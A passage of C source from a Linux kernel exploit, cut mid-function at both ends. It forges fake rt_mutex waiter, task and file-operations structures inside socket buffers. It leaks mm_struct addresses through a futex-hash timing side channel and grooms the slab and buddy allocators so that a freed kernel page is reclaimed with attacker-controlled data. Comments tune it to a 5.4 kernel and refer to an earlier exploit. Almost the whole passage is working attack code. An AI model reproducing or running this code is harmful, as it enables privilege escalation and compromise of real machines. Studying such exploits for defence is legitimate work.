    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    /* W0.tree_entry must be a BLACK root (pc=0, parent=NULL): the walk's
     * [7] rt_mutex_enqueue inserts the stack waiter under W0, and
     * rb_insert_color runs. A RED root (pc=1) causes rb_insert_color to
     * walk to the grandparent = rb_red_parent(NULL) = NULL -> deref -> panic
     * (sabrina bug #8). */
    {
      uintptr_t pi_pc = write_pc;
      uintptr_t pi_r = write_right;
      uintptr_t pi_l = write_left;
      if (getenv("GHOST_TEST")) {
        pi_pc = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
        pi_r = 0;
        pi_l = 0;
      }
      put_fake_waiter(p, W0_OFF, 0, 0, 0, pi_pc, pi_r, pi_l,
                      waiter_task, fake_lock, waiter_prio);
    }

#if defined(PAYLOAD_DUAL_LOCK_SCAN) && PAYLOAD_DUAL_LOCK_SCAN
    /* Second fake lock + waiter (for the input-word geometry scan): the
     * route alternates the two lock pointers across every input fdset
     * word. Whichever word the walk's [W+0x38] actually reads, the
     * trylock succeeds and the [7] rb_erase writes the OTHER lock into
     * the walked lock's waiters tree - the canary readback then shows a
     * cross-pointer that identifies the exact word position. */
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      uintptr_t lock_b = payload_base + LOCK_OFF + 0x100;
      uintptr_t w0_b = payload_base + W0_OFF + 0x100;
      put32(p, LOCK_OFF + 0x100, 0);          /* B wait_lock */
      put64(p, LOCK_OFF + 0x108, w0_b);       /* B waiters.rb_node */
      put64(p, LOCK_OFF + 0x110, w0_b);       /* B rb_leftmost */
      put64(p, LOCK_OFF + 0x118, fake_task | 1);
      put_fake_waiter(p, W0_OFF + 0x100, 1, 0, 0,
                      (canon_addr(ASHMEM_MISC_FOPS) - 8) | 1,
                      fake_fops, 0,
                      waiter_task, lock_b, waiter_prio);
    }
#endif

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 2);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /* pi_waiters empty: the dequeue_pi erase of W0 only consults
       * W0.pi_tree_entry's own fields (parent != NULL so the root is
       * untouched), and enqueue_pi then inserts the stack waiter as the
       * new root/leftmost. Matches the sabrina exploit's layout. */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
      put_slide_bank_entry(p, payload_base, 0,
                           slide_bank_parents[0],
                           slide_bank_targets[0]);
#endif
    }
  }
  return 1;
}

static uintptr_t controlled_match_mm_page(
    const struct kernelsnitch_shared_state *state, uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t matches = 0;

  for (uintptr_t candidate = base;
       candidate + MM_STRUCT_SZ <= base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(state->futex_addrs[0], candidate);
    int equal = 1;
    for (size_t i = 1; i < state->collisions; i++) {
      if (hash != futex_hash(state->futex_addrs[i], candidate)) {
        equal = 0;
        break;
      }
    }
    if (equal) {
      found = candidate;
      matches++;
    }
  }
  return matches == 1 ? found : (uintptr_t)-1;
}

/* Allocate one dead-but-mmgrabbed mm_struct and leak its address. With a
 * page hint, only the 34 candidates in that slab are tested; if the new mm
 * landed elsewhere, retry once with the full KernelSnitch scan. */
static int controlled_leak_mm(int cpu_count, uintptr_t hint,
                              uintptr_t *mm_out) {
  uintptr_t current_hint = hint;
  for (int pass = 0; pass < (hint ? 2 : 1); pass++) {
    /* Two-address hint matching has a ~34/4096 false-hit chance per
     * allocation on this futex table; across a full 34-slot group that is
     * enough to accept an fd whose real mm lives on another page, leaving
     * the target slab pinned. Keep all four collision constraints even for
     * hinted page-only matching. */
    size_t collisions = KSNITCH_COLLISIONS;
    ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    kernelsnitch_set_profile(ks, 512, 64, 8);

    pid_t child = clone_leak_child();
    int fd = open_memfd(child);
    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);

    if (waited != child || !WIFEXITED(status) || WEXITSTATUS(status) ||
        !kernelsnitch_found_collisions(ks)) {
      close(fd);
      ks->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(ks);
      ks = NULL;
      if (current_hint) {
        current_hint = 0;
        continue;
      }
      return -1;
    }

    if (current_hint) {
      ks->mm_struct = controlled_match_mm_page(ks, current_hint);
      ks->found = ks->mm_struct != (uintptr_t)-1;
      ks->state = ks->found ? KERNELSNITCH_MM_FOUND
                            : KERNELSNITCH_MM_NOT_FOUND;
    } else {
      kernelsnitch_bruteforce(ks);
    }

    uintptr_t mm = ks->mm_struct;
    kernelsnitch_cleanup(ks);
    ks = NULL;
    if (mm != (uintptr_t)-1) {
      *mm_out = mm;
      return fd;
    }

    close(fd);
    if (current_hint) {
      current_hint = 0;
      continue;
    }
    return -1;
  }
  return -1;
}

#define CONTROLLED_RECLAIM_SCAN_MAX 192
#define CONTROLLED_RECLAIM_GROUPS 32
#define CONTROLLED_RECLAIM_TRIGGER_SLABS 24

/* Collect every object in one real mm_struct slab. If its order-3 buddy is
 * already among the tracked groups, retain one object there as a merge guard.
 * The guard is opportunistic: physical buddy pairs are too sparse to require
 * one, so the reclaim spray must also cover buddy-merged higher orders. */
static int controlled_collect_mm_slab(
    uintptr_t *base_out, int target_fds[], int *buddy_guard_fd_out,
    uintptr_t *buddy_base_out) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  uintptr_t bases[CONTROLLED_RECLAIM_GROUPS] = {0};
  size_t counts[CONTROLLED_RECLAIM_GROUPS] = {0};
  int *fds = malloc(CONTROLLED_RECLAIM_GROUPS * batch * sizeof(*fds));
  unsigned char *seen = calloc(CONTROLLED_RECLAIM_GROUPS * batch, 1);
  int *opaque = malloc(CONTROLLED_RECLAIM_SCAN_MAX * sizeof(*opaque));
  if (!fds || !seen || !opaque) {
    free(fds);
    free(seen);
    free(opaque);
    return 0;
  }
  for (size_t i = 0; i < CONTROLLED_RECLAIM_GROUPS * batch; i++)
    fds[i] = -1;
  for (size_t i = 0; i < batch; i++)
    target_fds[i] = -1;
  *buddy_guard_fd_out = -1;
  *buddy_base_out = 0;

  size_t group_count = 0;
  size_t opaque_count = 0;
  size_t selected = CONTROLLED_RECLAIM_GROUPS;
  size_t guard_group = CONTROLLED_RECLAIM_GROUPS;
  uintptr_t hint = 0;
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);

  pin_to_core(0);
  for (int attempt = 1;
       attempt <= CONTROLLED_RECLAIM_SCAN_MAX &&
       selected == CONTROLLED_RECLAIM_GROUPS;
       attempt++) {
    uintptr_t mm = 0;
    int fd = controlled_leak_mm(cpu_count, hint, &mm);
    if (fd < 0)
      continue;

    uintptr_t base = mm & ~(ORDER3_SIZE - 1);
    size_t slot = (mm - base) / MM_STRUCT_SZ;
    if (slot >= batch || base < DIRECT_MAP_BASE || base >= DIRECT_MAP_END) {
      close(fd);
      hint = 0;
      continue;
    }

    size_t group = CONTROLLED_RECLAIM_GROUPS;
    for (size_t i = 0; i < group_count; i++) {
      if (bases[i] == base) {
        group = i;
        break;
      }
    }
    if (group == CONTROLLED_RECLAIM_GROUPS &&
        group_count < CONTROLLED_RECLAIM_GROUPS) {
      group = group_count++;
      bases[group] = base;
    }
    if (group == CONTROLLED_RECLAIM_GROUPS) {
      close(fd);
      hint = 0;
      continue;
    }

    size_t index = group * batch + slot;
    if (seen[index]) {
      if (opaque_count < CONTROLLED_RECLAIM_SCAN_MAX)
        opaque[opaque_count++] = fd;
      else
        close(fd);
      hint = 0;
      continue;
    }

    seen[index] = 1;
    fds[index] = fd;
    counts[group]++;
    hint = counts[group] < batch ? base : 0;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] == batch) {
      pr_info("controlled mm group attempt=%d base=%016zx slot=%zu count=%zu/%zu\n",
              attempt, base, slot, counts[group], batch);
    }

    if (counts[group] == batch) {
      selected = group;
      *base_out = bases[group];
      uintptr_t buddy = bases[group] ^ ORDER3_SIZE;
      for (size_t candidate = 0; candidate < group_count; candidate++) {
        if (candidate != group && counts[candidate] > 0 &&
            bases[candidate] == buddy) {
          guard_group = candidate;
          *buddy_base_out = buddy;
          pr_info("controlled mm optional buddy guard target=%016zx buddy=%016zx buddy_objs=%zu\n",
                  *base_out, buddy, counts[candidate]);
          break;
        }
      }
    }
  }

  for (size_t group = 0; group < group_count; group++) {
    for (size_t slot = 0; slot < batch; slot++) {
      int fd = fds[group * batch + slot];
      if (fd < 0)
        continue;
      if (group == selected) {
        target_fds[slot] = fd;
      } else if (group == guard_group && *buddy_guard_fd_out < 0) {
        *buddy_guard_fd_out = fd;
      } else {
        close(fd);
      }
    }
  }
  for (size_t i = 0; i < opaque_count; i++)
    close(opaque[i]);

  free(opaque);
  free(seen);
  free(fds);
  return selected != CONTROLLED_RECLAIM_GROUPS;
}

static void controlled_seed_order3_pages(void) {
  int sv[2] = {-1, -1};
  unsigned char *buf = malloc(SKB_SEND_SIZE);
  if (!buf || socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
    free(buf);
    return;
  }
  memset(buf, 0x53, SKB_SEND_SIZE);
  int sndbuf = 8 << 20;
  setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(sv[0], F_GETFL, 0);
  if (flags >= 0)
    fcntl(sv[0], F_SETFL, flags | O_NONBLOCK);
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = SKB_SEND_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  pin_to_core(0);
  int sent = 0;
  for (int i = 0; i < 128; i++) {
    if (sendmsg(sv[0], &msg, MSG_DONTWAIT) <= 0)
      break;
    sent++;
  }
  close(sv[0]);
  close(sv[1]);
  free(buf);
  for (int i = 0; i < 4; i++)
    sched_yield();
  pr_info("controlled order-3 UNMOVABLE seed sends=%d/128\n", sent);
}

int collect_controlled_mm_slab_page(
    uintptr_t *base_out, int target_fds[], int *buddy_guard_fd_out,
    uintptr_t *buddy_base_out) {
  controlled_seed_order3_pages();
  return controlled_collect_mm_slab(
      base_out, target_fds, buddy_guard_fd_out, buddy_base_out);
}

int release_controlled_mm_slab_page(
    int target_fds[], int *anchor_fd_out, unsigned long *slabs_before_out) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  size_t trigger_count = CONTROLLED_RECLAIM_TRIGGER_SLABS * batch;
  int *triggers = malloc(trigger_count * sizeof(*triggers));
  if (!triggers)
    return 0;

  pin_to_core(0);
  for (size_t i = 0; i < trigger_count; i++)
    triggers[i] = clone_memfd();
  int anchor_fd = clone_memfd();

  if (slabs_before_out) {
    struct mm_slabinfo info = {0};
    if (!read_mm_slabinfo(&info)) {
      free(triggers);
      return 0;
    }
    *slabs_before_out = info.num_slabs;
  }

  for (size_t i = 0; i + 1 < batch; i++) {
    SYSCHK(close(target_fds[i]));
    target_fds[i] = -1;
  }
  usleep(1000000);
  for (size_t slab = 0; slab < CONTROLLED_RECLAIM_TRIGGER_SLABS; slab++) {
    size_t index = slab * batch;
    SYSCHK(close(triggers[index]));
    triggers[index] = -1;
  }
  SYSCHK(close(target_fds[batch - 1]));
  target_fds[batch - 1] = -1;

  free(triggers); /* remaining fds intentionally stay open for this attempt */
  if (anchor_fd_out)
    *anchor_fd_out = anchor_fd;
  return 1;
}

static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  int target_fds[ORDER3_SIZE / MM_STRUCT_SZ];
  uintptr_t base = 0;
  uintptr_t buddy_base = 0;
  int buddy_guard_fd = -1;

  close_reclaim_sockets();
  if (skb_buf) {
    free(skb_buf);
    skb_buf = NULL;
  }
  if (!collect_controlled_mm_slab_page(
          &base, target_fds, &buddy_guard_fd, &buddy_base)) {
    pr_warning("controlled mm group collection failed\n");
    return 0;
  }
  pr_info("controlled reclaim optional guard fd=%d buddy=%016zx\n",
          buddy_guard_fd, buddy_base);

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf)
    return 0;
  memset(skb_buf, 0x41, SKB_SEND_SIZE);
  if (!prepare_skb_payload(base, payload_mode))
    return 0;

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 8 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags >= 0)
    fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);

  struct iovec iov = {
    .iov_base = skb_buf,
    .iov_len = SKB_SEND_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  int uring_prewarm = controlled_uring_prewarm();
  pr_info("controlled io_uring prewarm=%d\n", uring_prewarm);
  controlled_uring_finish_prewarm();

  unsigned long slab_before = 0;
  int anchor_fd = -1;
  if (!release_controlled_mm_slab_page(
          target_fds, &anchor_fd, &slab_before))
    return 0;

  /* High-order pages bypass the order-0 PCP on this 5.4 kernel and merge
   * synchronously in the buddy allocator. Map payload-backed io_uring blocks
   * at orders 3..9 before the order-3 skb fallback so a merged target is
   * captured at whichever order stopped coalescing. */
  int spectrum = controlled_spectrum_reclaim();

  int sent = 0;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) <= 0)
      break;
    sent++;
  }
  struct mm_slabinfo slab_after = {0};
  int slab_after_ok = read_mm_slabinfo(&slab_after);
  pr_info("controlled reclaim base=%016zx target_objs=%zu trigger_slabs=%d spectrum=%d sends=%d/%d anchor=%d slabs=%lu->%lu\n",
          base, batch, CONTROLLED_RECLAIM_TRIGGER_SLABS, spectrum, sent,
          SKB_RECLAIM_SENDS, anchor_fd, slab_before,
          slab_after.num_slabs);
  if (!slab_after_ok || slab_after.num_slabs >= slab_before) {
    pr_warning("controlled reclaim rejected: target slab was not discarded\n");
    close_reclaim_sockets();
    return 0;
  }
  if (getenv("CONTROLLED_RECLAIM_PROBE")) {
    pr_info("controlled reclaim probe complete; skipping PI walk\n");
    close_reclaim_sockets();
    return 0;
  }
  return (spectrum || sent) ? base : 0;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  if (getenv("CONTROLLED_RECLAIM"))
    return prepare_controlled_kernel_page(payload_mode);
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 8 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  struct mm_slabinfo slab_before = {0};
  if (!read_mm_slabinfo(&slab_before)) {
    pr_warning("mm slab gate: cannot read /proc/slabinfo\n");
    close(pcp_shaping_sv[0]);
    close(pcp_shaping_sv[1]);
    close_reclaim_sockets();
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++)
      kill_child(prepare_ctx.childs[i]);
    cleanup_page_prepare_state();
    return 0;
  }

  /* Force a known CPU-partial state before freeing the target. mm_struct
   * has cpu_partial=13 and min_partial=5 on this kernel. One first-free
   * from each full prepare slab contributes one partial object; 16 flush
   * slabs guarantee an overflow/reset before the target page is touched. */
  size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
  size_t flush_slabs = 16;
  if (flush_slabs > prepare_slabs)
    flush_slabs = prepare_slabs;
  for (size_t i = 0; i < flush_slabs; i++) {
    size_t index = i * mm_objs_per_slab;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
  for (size_t i = 0; i < flush_slabs; i++) {
    size_t index = i * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
  }

  /* The pre/leak/post burst spans exactly two full 34-object slabs. Their
   * children are already dead, while these mem fds hold the mm_count refs.
   * Closing every ref now empties both slabs while the target is frozen on
   * this CPU's private partial list. */
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;

  int reclaim_sends = SKB_RECLAIM_SENDS;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
#endif
  int reclaim_sent = 0;

  /* The remaining full prepare slabs overflow cpu_partial again. The
   * unfreeze pass discards the now-empty target to the order-3 PCP; put an
   * order-3 skb allocation directly after every trigger so the exposure
   * window is one syscall rather than the whole drain loop. */
  size_t drain_triggers = prepare_slabs - flush_slabs;
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index = (flush_slabs + i) * mm_objs_per_slab;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;

    if (reclaim_sent < reclaim_sends) {
      errno = 0;
      if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) > 0)
        reclaim_sent++;
    }
  }

  while (reclaim_sent < reclaim_sends) {
    errno = 0;
    if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) <= 0)
      break;
    reclaim_sent++;
  }
  pr_info("mm cpu-partial flush=%zu drain=%zu\n",
          flush_slabs, drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends, payload_mode);

  struct mm_slabinfo slab_after = {0};
  int slab_after_ok = read_mm_slabinfo(&slab_after);
  pr_info("mm slab gate before=%lu/%lu after=%lu/%lu\n",
          slab_before.active_slabs, slab_before.num_slabs,
          slab_after.active_slabs, slab_after.num_slabs);
  if (!slab_after_ok || slab_after.num_slabs >= slab_before.num_slabs) {
    pr_warning("mm slab gate rejected reclaim: target slab was not discarded\n");
    close_reclaim_sockets();
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      if (prepare_ctx.childs[i] > 0) {
        kill_child(prepare_ctx.childs[i]);
        prepare_ctx.childs[i] = -1;
      }
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS || payload_mode == PAGE_PAYLOAD_MISC_READ || payload_mode == PAGE_PAYLOAD_MISC_WRITE) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  if (getenv("CONTROLLED_RECLAIM"))
    max_attempts = 1;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    size_t started_ns = gettime_ns();
    uintptr_t base = prepare_kernel_page(payload_mode);
    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
            "base=%016zx\n",
            payload_mode, attempt, max_attempts, elapsed_ms, base);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif

struct uring_sqe {
  uint8_t opcode;
  uint8_t flags;
  uint16_t ioprio;
  int32_t fd;
  uint64_t off;
  uint64_t addr;
  uint32_t len;
  uint32_t rw_flags;
  uint64_t user_data;
  uint16_t buf_index;
  uint16_t personality;
  int32_t splice_fd_in;
  uint64_t pad2[2];
};

struct uring_cqe {
  uint64_t user_data;
  int32_t res;
  uint32_t flags;
};

struct uring_params {
  uint32_t sq_entries;
  uint32_t cq_entries;
  uint32_t flags;
  uint32_t sq_thread_cpu;
  uint32_t sq_thread_idle;
  uint32_t features;
  uint32_t wq_fd;
  uint32_t resv[3];
  struct {
    uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array, resv1, resv2;
  } sq_off;
  struct {
    uint32_t head, tail, ring_mask, ring_entries, overflow, cqes, flags, resv1, resv2;
  } cq_off;
};

#define URING_OFF_SQ_RING 0ULL
#define URING_OFF_CQ_RING 0x8000000ULL
#define URING_OFF_SQES    0x10000000ULL
#define IORING_OP_READV   1
#define IORING_OP_WRITEV  2
#define IORING_ENTER_GETEVENTS 1

#define CONTROLLED_URING_PREWARM 8
#define CONTROLLED_URING_MAX 16

struct controlled_uring_hold {
  int fd;
  void *rings;
  size_t rings_size;
  void *sqes;
  size_t sqes_size;
};

static int controlled_uring_prewarm_fds[CONTROLLED_URING_PREWARM];
static int controlled_uring_prewarm_count;
static struct controlled_uring_hold
    controlled_uring_holds[CONTROLLED_URING_MAX];
static int controlled_uring_hold_count;

static size_t controlled_uring_alloc_size(size_t used) {
  size_t pages = (used + PAGE_SIZE - 1) / PAGE_SIZE;
  size_t rounded = 1;
  while (rounded < pages)
    rounded <<= 1;
  return rounded * PAGE_SIZE;
}

static int controlled_uring_prewarm(void) {
  if (controlled_uring_prewarm_count)
    return controlled_uring_prewarm_count;

  struct rlimit memlock;
  if (getrlimit(RLIMIT_MEMLOCK, &memlock) == 0) {
    rlim_t old_cur = memlock.rlim_cur;
    if (memlock.rlim_cur < memlock.rlim_max) {
      memlock.rlim_cur = memlock.rlim_max;
      setrlimit(RLIMIT_MEMLOCK, &memlock);
      getrlimit(RLIMIT_MEMLOCK, &memlock);
    }
    pr_info("controlled memlock soft=%llu->%llu hard=%llu\n",
            (unsigned long long)old_cur,
            (unsigned long long)memlock.rlim_cur,
            (unsigned long long)memlock.rlim_max);
  }

  for (int i = 0; i < CONTROLLED_URING_PREWARM; i++) {
    struct uring_params p;
    memset(&p, 0, sizeof(p));
    int fd = (int)syscall(__NR_io_uring_setup, 1, &p);
    if (fd < 0) {
      pr_warning("controlled io_uring prewarm setup=%d errno=%d\n", i,
                 errno);
      break;
    }
    controlled_uring_prewarm_fds[controlled_uring_prewarm_count++] = fd;
  }
  return controlled_uring_prewarm_count;
}

static void controlled_uring_finish_prewarm(void) {
  for (int i = 0; i < controlled_uring_prewarm_count; i++) {
    close(controlled_uring_prewarm_fds[i]);
    controlled_uring_prewarm_fds[i] = -1;
